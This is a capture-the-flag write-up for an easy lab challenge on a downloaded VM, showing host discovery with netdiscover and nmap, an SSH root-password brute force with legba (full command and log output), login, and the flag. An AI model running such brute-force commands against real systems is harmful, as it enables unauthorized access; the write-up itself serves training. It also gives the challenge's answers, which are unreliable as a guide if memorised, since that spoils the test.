#  📌 Challenge Overview

| 🧩 Platform & Name | Challenginno/Online-Password-Attack |
| ------------------- | ------------------------------- |
| 📅 Date             | 2026-11-15 |
| 👾 Solver           | ph4nt01 |
| 🔰 Category         | Network |
| ⭐ Difficulty        | Easy |
| 🎯 Points           | 10 |

---

# 📋 Initial Info:

### One of the methods for gaining initial access is using password attack techniques. In this method, based on examining/enumerating the active services, we carry out this type of attack against the system.
### (To solve this challenge, you first need to download the existing virtual machine.)
### - What is the name of the active service on the machine along with the port number? (for example, http-8090) -> 2 Points
### - What is the password for the root account? -> 3 Points
### - What is the value of the Flag in the machine? -> 5 Points

---

# 🔍 Initial Analysis:

### - First i ran `netdiscover` from the kali VM and found its IP (192.168.215.132)
### - Then i ran `nmap 192.168.215.132` to see its open ports and i saw port 22 open
### - Then i ran `nmap 192.168.215.132 -p 22 -sV` to see what is running on that port and i saw:
###  ```sh
###  22/tcp open  ssh     OpenSSH 9.1 (protocol 2.0)
###  ```
### - So the first flag would be `ssh-22`
### - Now since we already are given the user (root), we must brute force the password

---

# 🔓 Solving

### - Used hydra and medusa for password brute force but they were too slow so i used legba
### ```sh
### sudo apt install legba
### legba ssh -T 192.168.215.132 -U root -P usr/share/wordlists/500-worst-passwords.txt --concurrency 50 --timeout 10000
### legba v1.3.0
### [INFO ] target: 192.168.215.132
### [INFO ] username -> string 'root'
### [INFO ] password -> wordlist Desktop/500-worst-passwords.txt
### [INFO ] tasks=50 mem=23.4 MiB targets=1 attempts=500 done=0 (0.00%) timeout=10000ms speed=0 reqs/s
### [INFO ] tasks=50 mem=28.4 MiB targets=1 attempts=500 done=44 (8.80%) timeout=10000ms speed=7 reqs/s
### [INFO ] tasks=50 mem=30.4 MiB targets=1 attempts=500 done=100 (20.00%) timeout=10000ms speed=12 reqs/s
### [INFO ] tasks=50 mem=31.6 MiB targets=1 attempts=500 done=179 (35.80%) timeout=10000ms speed=14 reqs/s
### [INFO ] tasks=50 mem=32.9 MiB targets=1 attempts=500 done=261 (52.20%) timeout=10000ms speed=16 reqs/s
### [INFO ] tasks=50 mem=33.6 MiB targets=1 attempts=500 done=333 (66.60%) timeout=10000ms speed=15 reqs/s
### [INFO ] tasks=50 mem=34.3 MiB targets=1 attempts=500 done=411 (82.20%) timeout=10000ms speed=14 reqs/s
### [INFO ] [2026-11-15 05:03:12] (ssh) <192.168.215.132:22> username=root password=Password123
### [INFO ] tasks=50 mem=34.6 MiB targets=1 attempts=500 done=484 (96.80%) timeout=10000ms speed=15 reqs/s
### [INFO ] runtime 37.063625693s
### ```
### - As you see it found the password so we enter the ssh connection to grab the flag
### ```sh
### ssh root@192.168.215.132
### ```
### - in the home dir there is a file named `...` and the flag was in it
### ```sh
### root@photon-machine [ ~ ]# cat ...
### salam
### flag is ssh_brute_force
### ```

---

```markdown

🚩 Flag -> `ssh_brute_force`

```

---

# 📚 Takeaways

### - legba is way faster than hydra and medusa for ssh brute force

---
